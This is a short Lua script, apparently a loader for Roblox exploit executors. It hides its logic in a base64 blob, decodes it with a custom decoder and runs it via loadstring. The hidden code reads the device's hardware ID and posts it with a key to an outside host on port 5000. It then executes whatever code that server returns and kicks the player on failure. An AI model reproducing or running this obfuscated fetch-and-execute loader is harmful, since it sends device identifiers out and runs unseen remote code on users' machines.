local _p = "bG9jYWwgaHdpZCA9ICJVbmtub3duIjsKaWYgc3luIGFuZCBzeW4uZ2V0X2h3aWQgdGhlbiBod2lkID0gc3luLmdldF9od2lkKCk7CmVsc2VpZiBnZXRod2lkIHRoZW4gaHdpZCA9IGdldGh3aWQoKTsKZWxzZWlmIEZsdXh1cyBhbmQgRmx1eHVzLmdldF9od2lkIHRoZW4gaHdpZCA9IEZsdXh1cy5nZXRfaHdpZCgpOwplbHNlaWYgaWRlbnRpZnlleGVjdXRvciB0aGVuCiAgICBsb2NhbCBleGVjTmFtZSA9IGlkZW50aWZ5ZXhlY3V0b3IoKTsKICAgIGlmIGV4ZWNOYW1lID09ICJEZWx0YSIgb3IgZXhlY05hbWUgPT0gIkh5ZHJvZ2VuIiB0aGVuCiAgICAgICAgaHdpZCA9IGV4ZWNOYW1lIC4uIl8iLi4oZ2V0Y3VzdG9tYXNzZXQgYW5kICJzZWN1cmUiIG9yICJzdGFuZGFyZCIpOwogICAgZW5kCmVuZAppZiBub3QgaHdpZCBvciBod2lkID09ICJVbmtub3duIiBvciBod2lkID09ICIiIHRoZW4KICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyOktpY2soIltNaW5lbWlueWVlXSBTZWN1cml0eSBFcnJvcjogSW52YWxpZCBIV0lELiIpOwogICAgcmV0dXJuOwplbmQKbG9jYWwgcywgciA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgIHJldHVybiByZXF1ZXN0KHsKICAgICAgICBVcmwgPSAiaHR0cDovL2x1YS1zY3JpcHRsdWFybW9yLmtyby5rcjo1MDAwL2xvYWRlci5sdWEiLAogICAgICAgIE1ldGhvZCA9ICJQT1NUIiwKICAgICAgICBIZWFkZXJzID0geyBbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iIH0sCiAgICAgICAgQm9keSA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKTpKU09ORW5jb2RlKHsga2V5ID0gc2NyaXB0X2tleSwgaHdpZCA9IGh3aWQgfSkKICAgIH0pCmVuZCk7CmlmIHMgYW5kIHIgYW5kIHIuU3RhdHVzQ29kZSA9PSAyMDAgdGhlbgogICAgbG9jYWwgZiwgZXJyID0gbG9hZHN0cmluZyhyLkJvZHkpOwogICAgaWYgZiB0aGVuIGYoKTsgZWxzZSB3YXJuKCJbTWluZW1pbnllZV0gRXJyb3I6ICIgLi4gdG9zdHJpbmcoZXJyKSk7IGVuZAplbHNlCiAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcjpLaWNrKCJbTWluZW1pbnllZV0gQXV0aCBGYWlsZWQuIik7CmVuZDs=";
local function _d(b)
    local c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
    b=string.gsub(b, '[^'..c..'=]', '')
    return (b:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f='',(c:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local t=0 for i=1,8 do t=t+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(t)
    end))
end
local f, e = loadstring(_d(_p));
if f then f(); else warn("Loader Error: " .. tostring(e)); end
